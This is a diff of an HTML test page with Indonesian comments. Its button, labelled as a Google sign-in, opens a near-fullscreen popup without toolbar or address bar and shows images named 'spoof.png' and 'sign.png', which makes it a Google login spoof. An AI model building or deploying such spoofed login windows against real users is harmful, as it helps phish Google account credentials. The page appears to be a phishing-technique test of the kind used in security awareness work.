@@ -1,138 +1,90 @@
-<!DOCTYPE HTML>
+<!DOCTYPE html>
 <html lang="en-US">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, user-scalable=no">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, user-scalable=no" />
     <title>URL TESTING WEBVIEW</title>
     <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            overflow: hidden;
-            background: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        #spoof-img {
-            display: none; /* Awalnya disembunyikan */
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-            position: absolute;
-            top: 0;
-            left: 0;
-            z-index: 1;
-        }
-        .signin-link {
-            padding: 20px 40px;
-            background: #4285f4;
-            color: white;
-            font-size: 18px;
-            text-decoration: none;
-            border-radius: 4px;
-            cursor: pointer;
-            z-index: 10;
-            position: relative; /* Agar bisa disembunyikan dengan lancar */
-        }
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        width: 100%;
+        overflow: hidden;
+        background: #fff;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+      #spoof-img {
+        display: none; /* Awalnya disembunyikan */
+        max-width: 100%;
+        max-height: 100%;
+        object-fit: contain;
+        position: absolute;
+        top: 0;
+        left: 0;
+        z-index: 1;
+      }
+      .signin-link {
+        padding: 20px 40px;
+        background: #4285f4;
+        color: white;
+        font-size: 18px;
+        text-decoration: none;
+        border-radius: 4px;
+        cursor: pointer;
+        z-index: 10;
+        position: relative; /* Agar bisa disembunyikan dengan lancar */
+      }
     </style>
-<script>
-    function goFullscreen(win) {
-        var elem = win.document.documentElement;
+    <script>
+      function goFullscreen() {
+        var elem = document.documentElement;
         if (elem.requestFullscreen) elem.requestFullscreen();
         else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
         else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
         else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-    }
+      }
 
-    function openWin() {
-        // Buka popup sebagai about:blank (hampir fullscreen, tanpa toolbar)
-        var params = 'width=' + screen.width +
-                     ',height=' + screen.height +
-                     ',top=0,left=0' +
-                     ',menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no';
+      function openWin() {
+        // Buka popup hampir fullscreen
+        var params =
+          "width=" +
+          screen.width +
+          ",height=" +
+          screen.height +
+          ",top=0,left=0" +
+          ",menubar=no,toolbar=no,location=no,status=no,scrollbars=no,resizable=no";
 
-        var win = window.open("about:blank", "google_signin", params);
+        var win = window.open("opener.html", "google_signin", params);
         if (win) {
-            win.moveTo(0, 0);
-            win.resizeTo(screen.width, screen.height);
-
-            // Tulis HTML lengkap ke popup (dengan gambar sign.png)
-            win.document.write(`
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in</title>
-    <style>
-        body, html {
-            margin: 0;
-            padding: 0;
-            height: 100%;
-            width: 100%;
-            background: #fff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-        }
-        #sign-img {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-        }
-    </style>
-</head>
-<body>
-    <img id="sign-img" src="sign.png" alt="Sign in with Google">
-    <script>
-        function tryFullscreen() {
-            var elem = document.documentElement;
-            if (elem.requestFullscreen) elem.requestFullscreen();
-            else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
-            else if (elem.mozRequestFullScreen) elem.mozRequestFullScreen();
-            else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
-        }
-        // Coba fullscreen saat load
-        window.addEventListener('load', tryFullscreen);
-        document.addEventListener('DOMContentLoaded', tryFullscreen);
-    <\/script>
-</body>
-</html>
-            `);
-
-            win.document.close(); // Penting agar rendering selesai
-            win.focus();
-
-            // Coba fullscreen dari main window ke popup (kadang membantu)
-            setTimeout(function() {
-                goFullscreen(win);
-            }, 500);
+          win.moveTo(0, 0);
+          win.resizeTo(screen.width, screen.height);
+          win.focus();
         }
 
-        // Tampilkan spoof.png di main window
-        document.getElementById('spoof-img').style.display = 'block';
+        // Tampilkan gambar spoof.png langsung
+        document.getElementById("spoof-img").style.display = "block";
 
         // Sembunyikan tombol setelah 1 detik
-        setTimeout(function() {
-            document.querySelector('.signin-link').style.display = 'none';
+        setTimeout(function () {
+          document.querySelector(".signin-link").style.display = "none";
         }, 1000);
 
-        // Coba fullscreen di main window
-        goFullscreen(window);
-    }
-</script>
-</head>
-<body>
+        // Coba fullscreen
+        goFullscreen();
+      }
+    </script>
+  </head>
+  <body>
     <!-- Tombol awal -->
     <a href="#" class="signin-link" onclick="openWin(); return false;">
-        Click here to sign in into your Google Account v2
+      Click here to sign in into your Google Account v2
     </a>
 
     <!-- spoof.png akan muncul langsung setelah klik -->
-    <img id="spoof-img" src="spoof.png" alt="Google Login Spoof">
-</body>
+    <img id="spoof-img" src="spoof.png" alt="Google Login Spoof" />
+  </body>
 </html>
